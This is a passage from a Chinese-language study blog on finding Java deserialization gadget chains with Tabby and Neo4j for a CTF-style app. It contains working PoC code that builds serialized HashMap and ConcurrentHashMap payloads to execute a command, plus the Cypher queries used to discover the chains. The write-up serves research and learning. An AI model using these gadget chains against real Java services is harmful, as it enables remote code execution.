<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(coffeeBean, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">hashMap.put(xString, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>

<p>但其实这样是不行的，从<code>java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</code>到<code>java.lang.Object#equals(java.lang.Object)</code>，其实是HashMap在反序列化时逐个读入Node并放入table的过程中，对Node的key进行比较时触发的：</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527092611872.png" alt="image-20230527092611872"></p>
<p>而执行<code>key.equals(k)</code>的前提是<code>p.hash == hash</code>，也就是说两个Node的key的hash必须相同，HashMap中计算Key的hash是直接调用其hashCode方法</p>
<p><code>com.sun.org.apache.xpath.internal.objects.XString</code>中实现了hashCode方法，并且我们可以通过设置其中的<code>m_obj</code>为合适的字符串而让其hashCode为任意值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> str().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> != m_obj) ? ((String) m_obj) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>CoffeeBean</code>并未实现hashCode方法，这将调用<code>Object.hashCode()</code>，并且生成不可预测的hash值</p>
<p>不过我们可以利用<code>org.springframework.aop.target.HotSwappableTargetSource</code>类来当做一个”中继”，因为<code>HotSwappableTargetSource</code>实现了hashCode方法，并且每个<code>HotSwappableTargetSource</code>对象的hash值都是一样的，而且其equals方法会继续调用<code>target</code>对象的equals方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HotSwappableTargetSource.class.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object other)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span> == other || other <span class="keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个trick在<a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">marshalsec</a>这篇paper中有提到</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527101015470.png" alt="image-20230527101015470"></p>
<p>最终POC构造为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(coffeeBean);</span><br><span class="line"><span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">hashMap.put(hotSwappableTargetSource1, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">hashMap.put(hotSwappableTargetSource2, <span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(hashMap));</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">toString(), CoffeeBean (com.example.b4bycoffee.model)</span><br><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br><span class="line">readObject(ObjectInputStream), HashMap (java.util)</span><br></pre></td></tr></table></figure>



<h5 id="Case2-❌"><a href="#Case2-❌" class="headerlink" title="Case2 (❌)"></a>Case2 (❌)</h5><blockquote>
<p>写这一小节时，我对cypher语句的理解有误，导致有些误报排除的语句冗余或者错误，但写了很长已经懒得改了，小结末尾有指出错误点。</p>
</blockquote>
<p>前文已经发现这样不行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.util.HashMap#putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)</span><br></pre></td></tr></table></figure>

<p>但是这样可以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">equals(Object), XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals(Object), HotSwappableTargetSource (org.springframework.aop.target)</span><br><span class="line">putVal(int, Object, Object, boolean, boolean), HashMap (java.util)</span><br></pre></td></tr></table></figure>



<p>那么可以继续修改查询语句，将<code>HashMap.putVal()</code>调用非<code>HotSwappableTargetSource.equals()</code>的情况排除掉：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>



<p>再排除一些误报：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>查询出了一开始人工审的那条链：</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527104429695.png" alt="image-20230527104429695"></p>
<p>排除这条链，排除题目中的黑名单，增大maxNodeLength，继续查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 12, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>运行了好一会没有跑出结果</p>
<p>那么放宽我们source的条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230527112506697.png" alt="image-20230527112506697"></p>
<p>这条链的其中一环是：<code>java.awt.Window#setGraphicsConfiguration(java.awt.GraphicsConfiguration)</code> -&gt; <code>java.lang.StringBuilder#append(java.lang.Object)</code> -&gt; <code>java.lang.String#valueOf(java.lang.Object)</code> -&gt; <code>java.lang.Object#toString()</code></p>
<p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setGraphicsConfiguration</span><span class="params">(GraphicsConfiguration gc)</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  log.finer(<span class="string">&quot;+ Window.setGraphicsConfiguration(): new GC is \n+ &quot;</span> + getGraphicsConfiguration_NoClientCode() + <span class="string">&quot;\n+ this is &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Java中如果<code>+</code>运算符任意一边是对象的话，会优先调用对象的<code>valueOf</code>函数，如果<code>valueOf</code>返回的是对象或者没有<code>valueOf</code>方法的话，那么会调用对象的<code>toString</code>函数</p>
<p>然后看<code>getGraphicsConfiguration_NoClientCode()</code>和<code>this</code>所对应的类的相关方法，可以在Neo4j中辅助我们查找</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (c:Class)</span><br><span class="line">where (</span><br><span class="line">    (c)-[:EXTENDS*]-&gt;(:Class&#123;NAME:&quot;java.awt.Window&quot;&#125;) or c.NAME=&quot;java.awt.Window&quot;</span><br><span class="line">    or</span><br><span class="line">    (c)-[:EXTENDS*]-&gt;(:Class&#123;NAME:&quot;java.awt.GraphicsConfiguration&quot;&#125;) or c.NAME=&quot;java.awt.GraphicsConfiguration&quot;</span><br><span class="line">)</span><br><span class="line">and (</span><br><span class="line">    (c)-[:HAS]-&gt;(:Method&#123;NAME:&quot;valueOf&quot;&#125;)</span><br><span class="line">    or</span><br><span class="line">    (c)-[:HAS]-&gt;(:Method&#123;NAME:&quot;toString&quot;&#125;)</span><br><span class="line">)</span><br><span class="line">return c.NAME</span><br></pre></td></tr></table></figure>

<p>看完发现这条也是误报</p>
<p>继续排除一些误报后发现在maxNodeLength为8的情况下很久都跑不出来，试着降低一点可以跑出一些，遇到一个差一点就可以构造成功的链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,6, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;org.springframework.util.MimeType.getParameter&quot; &#125;)-[:CALL]-&gt;()-[:ALIAS]-&gt;()-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 = &quot;javax.swing.UIDefaults$TextAndMnemonicHashMap.get&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>



<p><strong>后面在不断的尝试中，发现前文我对查询语句的理解有点问题，懒得再回去修改笔记了🤣，且把问题记录一下吧。</strong></p>
<p>比如如下语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,5, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    (n)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br><span class="line">    and </span><br><span class="line">    n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>我以为查询出来的path肯定会包含这条子路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(:Method&#123;NAME0:&quot;javax.swing.text.html.CSS.readObject&quot;&#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>实则不然，这个意思是先根据如下语句查出符合条件的n节点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(n)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.util.Hashtable.put&quot;&#125;)-[:ALIAS]-&gt;(:Method&#123;NAME0:&quot;java.security.Provider.put&quot;&#125;)</span><br><span class="line">and </span><br><span class="line">n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br></pre></td></tr></table></figure>

<p>然后筛选出包含n节点的path，其实<code>NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</code>的节点有且仅有那一个，所以整个语句等效于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,5, false, false) yield path</span><br><span class="line">where any(n in nodes(path) where </span><br><span class="line">    n.NAME0 = &quot;javax.swing.text.html.CSS.readObject&quot;</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>





<p>同理如下语句也没办法排除<code>java.util.HashMap.putVal() -&gt; 非org.springframework.aop.target.HotSwappableTargetSource.equals  </code> 这条子链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">none(n in nodes(path) where </span><br><span class="line">    (:Method&#123; NAME0:&quot;java.util.HashMap.putVal&quot; &#125;)-[:CALL]-&gt;(:Method&#123;NAME0:&quot;java.lang.Object.equals&quot;&#125;)-[:ALIAS]-&gt;(n)</span><br><span class="line">    and</span><br><span class="line">    n.NAME0 &lt;&gt; &quot;org.springframework.aop.target.HotSwappableTargetSource.equals&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>它排除的是在整个数据库中，满足这种条件的n节点。</p>
<p>🥲</p>
<h5 id="Case3-ConcurrentHashMap-HashMap-ObjectIdGenerator-IdKey-equals-XString-equals-toString"><a href="#Case3-ConcurrentHashMap-HashMap-ObjectIdGenerator-IdKey-equals-XString-equals-toString" class="headerlink" title="Case3 (ConcurrentHashMap &#x2F; HashMap -&gt; ObjectIdGenerator$IdKey.equals -&gt; XString.equals -&gt; .toString)"></a>Case3 (ConcurrentHashMap &#x2F; HashMap -&gt; ObjectIdGenerator$IdKey.equals -&gt; XString.equals -&gt; .toString)</h5><blockquote>
<p>测试的时候发现可以关闭Neo4j设置中的 “Connect result nodes”，这样查询结果就只会显示调用路径，而不会显示多余的关系边</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;readObject&quot;&#125;)</span><br><span class="line">match (sink:Method &#123;NAME0:&quot;com.example.b4bycoffee.model.CoffeeBean.toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks,6, false, false) yield path</span><br><span class="line">where none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;com.sun.xml.internal.ws.api.BindingID.equals&quot;,&quot;org.yaml.snakeyaml.events.Event.equals&quot;,&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals&quot;,&quot;org.springframework.cache.interceptor.CacheOperation.equals&quot;,&quot;javax.swing.text.html.HTML$UnknownTag.equals&quot;,&quot;com.rometools.rome.feed.impl.EqualsBean.hashCode&quot;,&quot;java.awt.Window.setGraphicsConfiguration&quot;,&quot;java.awt.KeyboardFocusManager.setMostRecentFocusOwner&quot;,&quot;org.apache.logging.log4j.spi.AbstractLogger.readObject&quot;,&quot;javax.swing.JTree.unarchiveExpandedState&quot;,&quot;javax.swing.tree.TreeSelectionModel.addTreeSelectionListener&quot;,&quot;javax.swing.tree.TreeModel.addTreeModelListener&quot;,&quot;java.lang.Throwable.initCause&quot;,&quot;javax.swing.event.EventListenerList.add&quot;,&quot;java.security.Provider.putId&quot;,&quot;java.util.EnumMap.typeCheck&quot;,&quot;java.awt.datatransfer.DataFlavor.readExternal&quot;]</span><br><span class="line">) and none(n in nodes(path) where </span><br><span class="line">    n.CLASSNAME in [&quot;com.sun.corba.se.spi.orb.OperationFactory$OperationBase&quot;,&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.rometools.rome.feed.impl.ObjectBean&quot;,&quot;com.rometools.rome.feed.impl.ToStringBean&quot;,&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;]</span><br><span class="line">)and none(n in nodes(path) where </span><br><span class="line">    n.NAME0 in [&quot;javax.swing.JTree.readObject&quot;,&quot;java.text.SimpleDateFormat.readObject&quot;,&quot;org.springframework.util.MimeType.readObject&quot;,&quot;org.apache.logging.log4j.message.ObjectMessage.equals&quot;,&quot;javax.naming.directory.BasicAttributes.equals&quot;]</span><br><span class="line">)</span><br><span class="line">return path limit 1</span><br></pre></td></tr></table></figure>

<p>找到和case1很像的一条调用链路：</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528111243845.png" alt="image-20230528111243845"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString()</span><br><span class="line">java.lang.Object#toString()</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">com.fasterxml.jackson.annotation.ObjectIdGenerator$IdKey#equals(java.lang.Object)</span><br><span class="line">java.lang.Object#equals(java.lang.Object)</span><br><span class="line">java.util.concurrent.ConcurrentHashMap#readObject(java.io.ObjectInputStream)</span><br></pre></td></tr></table></figure>

<p>在case1中，是通过在<code>HashMap.putVal</code>和<code>XString.equals</code>之间插入<code>HotSwappableTargetSource</code>来解决key的hash不同的问题。</p>
<p>同样在<code>ConcurrentHashMap.readObject</code>中也存在对比key的hash值的问题，只有当key的hash相同，才会执行<code>k.equals(qk)</code>：</p>
<p><img src="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/image-20230528112234995.png" alt="image-20230528112234995"></p>
<p>再来看<code>com.fasterxml.jackson.annotation.ObjectIdGenerator$IdKey</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">IdKey</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> hashCode;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o.getClass() != <span class="built_in">this</span>.getClass()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">IdKey</span> <span class="variable">other</span> <span class="operator">=</span> (IdKey)o;</span><br><span class="line">            <span class="keyword">return</span> other.key.equals(<span class="built_in">this</span>.key) &amp;&amp; other.type == <span class="built_in">this</span>.type &amp;&amp; other.scope == <span class="built_in">this</span>.scope;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它实现了hashCode方法，而且hash值是我们直接可控的，并且equals方法中也是用的我们可控的两个key，所以<code>ObjectIdGenerator$IdKey</code>完全可以用于代替<code>HotSwappableTargetSource</code></p>
<p>POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">Tool.setFieldValue(coffeeBean, <span class="string">&quot;ClassByte&quot;</span>, Tool.getCMDByteCodes(<span class="string">&quot;touch /tmp/success&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,xString);</span><br><span class="line">ObjectIdGenerator.<span class="type">IdKey</span> <span class="variable">idKey2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectIdGenerator</span>.IdKey(Object.class,Object.class,coffeeBean);</span><br><span class="line">Tool.setFieldValue(idKey1,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line">Tool.setFieldValue(idKey2,<span class="string">&quot;hashCode&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ConcurrentHashMap&lt;Object, Object&gt; concurrentHashMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">concurrentHashMap.put(idKey2, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">concurrentHashMap.put(idKey1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tool.encodeBase64(Tool.serialize(concurrentHashMap));</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
